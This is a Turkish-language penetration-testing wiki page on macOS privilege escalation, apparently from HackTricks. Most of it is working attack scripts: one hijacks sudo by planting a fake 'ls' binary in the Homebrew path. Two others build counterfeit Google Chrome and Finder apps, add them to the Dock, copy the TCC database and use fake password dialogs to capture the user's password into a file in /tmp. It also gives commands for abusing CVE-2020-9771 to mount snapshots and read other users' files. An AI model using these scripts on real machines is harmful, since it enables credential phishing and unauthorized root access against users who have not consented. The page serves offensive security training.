# macOS Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## TCC Yetki Yükseltme

Eğer buraya TCC yetki yükseltme arayışıyla geldiyseniz, şu adrese gidin:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Lütfen unutmayın ki **Linux/Unix üzerinde yetki yükseltme ile ilgili olan çoğu hile, MacOS** makinelerini de etkileyecektir. Bu yüzden bakın:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Kullanıcı Etkileşimi

### Sudo Ele Geçirme

Orijinal [Sudo Ele Geçirme tekniğini Linux Yetki Yükseltme yazısında bulabilirsiniz](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Ancak, macOS **kullanıcının** **`PATH`**'ini **`sudo`** komutunu çalıştırdığında **korur**. Bu da, bu saldırıyı gerçekleştirmenin başka bir yolunun, mağdurun **sudo** ile çalıştırdığı **diğer ikili dosyaları ele geçirmek** olacağı anlamına gelir:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Not edin ki terminal kullanan bir kullanıcının **Homebrew yüklü olma olasılığı** yüksektir. Bu nedenle **`/opt/homebrew/bin`** içindeki ikili dosyaları ele geçirmek mümkündür.

### Dock Taklidi

Bazı **sosyal mühendislik** yöntemleri kullanarak dock içinde **örneğin Google Chrome'u taklit edebilir** ve aslında kendi scriptinizi çalıştırabilirsiniz:

{{#tabs}}
{{#tab name="Chrome Taklidi"}}
Bazı öneriler:

- Dock'ta bir Chrome olup olmadığını kontrol edin, bu durumda o girişi **kaldırın** ve Dock dizisinde **aynı konuma** **sahte** **Chrome girişini ekleyin.**&#x20;
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Bazı öneriler:

- **Finder'ı Dock'tan kaldıramazsınız**, bu yüzden eğer Dock'a ekleyecekseniz, sahte Finder'ı gerçek Finder'ın hemen yanına koyabilirsiniz. Bunun için **sahte Finder girişini Dock dizisinin başına eklemeniz** gerekiyor.
- Diğer bir seçenek, onu Dock'a yerleştirmemek ve sadece açmaktır; "Finder, Finder'ı kontrol etmek için izin istiyor" o kadar da garip değil.
- **Şifre sormadan root'a yükselmek** için başka bir seçenek, Finder'ın gerçekten bir ayrıcalıklı işlem gerçekleştirmek için şifre sormasını sağlamaktır:
- Finder'dan **`/etc/pam.d`** dizinine yeni bir **`sudo`** dosyası kopyalamasını isteyin (Şifre isteyen istem, "Finder sudo'yu kopyalamak istiyor" diye belirtecektir)
- Finder'dan yeni bir **Authorization Plugin** kopyalamasını isteyin (Dosya adını kontrol edebilirsiniz, böylece şifre isteyen istem "Finder Finder.bundle'ı kopyalamak istiyor" diye belirtecektir)
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

## TCC - Root Yetki Yükseltme

### CVE-2020-9771 - mount_apfs TCC atlatma ve yetki yükseltme

**Herhangi bir kullanıcı** (hatta yetkisiz olanlar bile) bir zaman makinesi anlık görüntüsü oluşturabilir ve bu anlık görüntünün **TÜM dosyalarına** erişebilir.\
Gerekli olan **tek yetki**, kullanılan uygulamanın (örneğin `Terminal`) **Tam Disk Erişimi** (FDA) erişimine sahip olmasıdır (`kTCCServiceSystemPolicyAllfiles`), bu da bir yönetici tarafından verilmelidir.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Hassas Bilgiler

Bu, ayrıcalıkları artırmak için faydalı olabilir:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
